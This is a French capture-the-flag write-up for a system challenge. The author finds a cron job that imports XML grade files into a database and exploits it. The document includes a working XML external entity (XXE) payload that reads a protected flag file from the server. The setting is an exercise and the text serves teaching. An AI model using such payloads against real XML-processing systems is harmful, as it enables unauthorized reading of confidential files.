# Graduated - 256 pts

C'est le dernier challenge système.

Énoncé :

> Vous avez raté votre examen de PHP. Cheh!
>  Furieux, vous avez décidé de prouver vos compétences en modifiant directement votre note sur le serveur de votre école. 
>  Vous avez réussi à compromettre les identifiants de votre professeur absent. 
>
>  === Connexion SSH ===
>  Login : `teacher`
>  Mdp :  `teacher`
>  Serveur :` graduated.phack.fr`
>
>  Artiste : `@Eagleslam`

```
$ ssh teacher@graduated.phack.fr

 Bienvenue !

 Le flag se trouve dans /home/rector/flag.txt
 Malheureusement, tu n'as pas les droits de le lire.

 Trouves un moyen d'y accéder par toi même.

 Bonne chance...


...............
$ cat note.txt 
------------------


Cher professeur,

Merci de saisir les notes de vos élèves dans la base de données dans les plus brefs délais car la fin du trimestre approche.

PS:
M. DUPONT est toujours absent. Nous lui recherchons un remplaçant au plus vite.

Bon courage,
Votre recteur.


------------------
```

Voyons voir le contenu de notre home :

```
$ ls -lRa
.:
total 36
drwxr-sr-x    1 teacher  nogroup       4096 Apr  9 13:55 .
drwxr-xr-x    1 root     root          4096 Apr  1 23:09 ..
-rw-------    1 teacher  nogroup        664 Apr  9 13:55 .bash_history
drwxrwxrwx    1 teacher  root          4096 Apr  9 13:55 evaluations
-r--r--r--    1 rector   root           304 Apr  1 22:56 note.txt
-r--r--r--    1 root     root           462 Apr  1 22:56 template.xml

./evaluations:
total 20
drwxrwxrwx    1 teacher  root          4096 Apr  9 13:55 .
drwxr-sr-x    1 teacher  nogroup       4096 Apr  9 13:55 ..
drwxr-xr-x    2 rector   nogroup       4096 Apr  9 13:55 done

./evaluations/done:
total 16
drwxr-xr-x    2 rector   nogroup       4096 Apr  9 13:55 .
drwxrwxrwx    1 teacher  root          4096 Apr  9 13:55 ..
$ cat template.xml 
<?xml version="1.0" encoding="utf-8"?>

<evaluation>
  <student>
    <firstname>Xavier</firstname>
    <lastname>DUPONT DE L</lastname>
  </student>
  <grade>15</grade>
  <subject>Biologie</subject>
  <teacher>
    <firstname>Emile</firstname>
    <lastname>LOUIS</lastname>
  </teacher>
  <comment>Elève motivé et consciencieux. Ne parle pas beaucoup avec les autres étudiants. Attention : Absence en cours depuis plusieurs semaines.</comment>
</evaluation>

```

De même pour le recteur :

```
$ cd /home/rector/
$ ls -lRa
/home/rector/:
total 2184
drwxr-sr-x    1 rector   nogroup       4096 Apr  9 13:55 .
drwxr-xr-x    1 root     root          4096 Apr  1 23:09 ..
-r--------    1 rector   root            39 Apr  1 22:56 flag.txt
-rw-r--r--    1 rector   nogroup      12288 Apr  9 13:55 graduation.db
-rw-r--r--    1 rector   root       2187461 Apr 10 19:38 integrator.log
-r-xr-----    1 rector   root          4708 Apr  1 22:56 integrator.py
$ strings graduation.db 
SQLite format 3
Ytablesqlite_sequencesqlite_sequence
CREATE TABLE sqlite_sequence(name,seq)
ytableevaluationsevaluations
CREATE TABLE evaluations
                         (ID INTEGER PRIMARY KEY  AUTOINCREMENT,
                         SUBJECT       TEXT    NOT NULL,
                         GRADE         INT     NOT NULL,
                         COMMENT       TEXT            ,
                         TEACHER       TEXT    NOT NULL,
                         STUDENT       TEXT    NOT NULL)
$ cat integrator.log
[...]
10/04/2021 19:38:01	[+] Lancement de l'intégration
10/04/2021 19:38:01	[+] Analye des fichiers dans "/home/teacher/evaluations/".
10/04/2021 19:38:01	[+] Intégration terminée


10/04/2021 19:39:01	[+] Lancement de l'intégration
10/04/2021 19:39:01	[+] Analye des fichiers dans "/home/teacher/evaluations/".
10/04/2021 19:39:01	[+] Intégration terminée


10/04/2021 19:40:01	[+] Lancement de l'intégration
10/04/2021 19:40:01	[+] Analye des fichiers dans "/home/teacher/evaluations/".
10/04/2021 19:40:01	[+] Intégration terminée
```

Il semblerait qu'une tâche cron exécute `integrator.py` toutes les minutes mais on ne voit pas le code en question. Essayons de copier le template dans le répertoire suggéré par les logs :

```
$ cd
$ cp template.xml evaluations/
$ tail -f ../rector/integrator.log 
10/04/2021 19:43:01	[+] Lancement de l'intégration
10/04/2021 19:43:01	[+] Analye des fichiers dans "/home/teacher/evaluations/".
10/04/2021 19:43:01	[+] Intégration terminée


10/04/2021 19:44:01	[+] Lancement de l'intégration
10/04/2021 19:44:01	[+] Analye des fichiers dans "/home/teacher/evaluations/".
10/04/2021 19:44:01	[+] Intégration terminée

10/04/2021 19:45:01	[+] Lancement de l'intégration
10/04/2021 19:45:01	[+] Analye des fichiers dans "/home/teacher/evaluations/".
10/04/2021 19:45:01	[+] Fichier "template.xml" en cours d'analyse.
10/04/2021 19:45:01	[+] Nouvelle évaluation ajoutée.
10/04/2021 19:45:01	[+] Fichier "template.xml" analysé.
10/04/2021 19:45:01	[+] Intégration terminée

^C
$ strings ../rector/graduation.db 
SQLite format 3
Ytablesqlite_sequencesqlite_sequence
CREATE TABLE sqlite_sequence(name,seq)
ytableevaluationsevaluations
CREATE TABLE evaluations
                         (ID INTEGER PRIMARY KEY  AUTOINCREMENT,
                         SUBJECT       TEXT    NOT NULL,
                         GRADE         INT     NOT NULL,
                         COMMENT       TEXT            ,
                         TEACHER       TEXT    NOT NULL,
                         STUDENT       TEXT    NOT NULL)
!#1Biologie
ve motiv
 et consciencieux. Ne parle pas beaucoup avec les autres 
tudiants. Attention : Absence en cours depuis plusieurs semaines.Emile LOUISXavier DUPONT DE LT
```

Le contenu est ajouté dans le fichier base de données. Il suffit donc de créer un fichier XML avec une entité externe qui va lire le contenu du flag :

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///home/rector/flag.txt">
  ]>

<evaluation>
  <student>
    <firstname>Xavier</firstname>
    <lastname>DUPONT DE L</lastname>
  </student>
  <grade>20</grade>
  <subject>Biologie</subject>
  <teacher>
    <firstname>Emile</firstname>
    <lastname>LOUIS</lastname>
  </teacher>
  <comment>&xxe;</comment>
</evaluation>
```

On sauvegarde ça dans `/home/teacher/evaluations/done/eval.xml` et on patiente un peu...

```
$ strings ../rector/graduation.db | grep PHACK
PHACK{XmL_3x7Ern4l_3n7i7iEs_fr0m_b4sH}
```



Première fois que j'arrive à finir les challenges de la catégorie *Sytème*, il faut croire que les cours de système d'exploitation et d'Unix ne sont pas vains ;)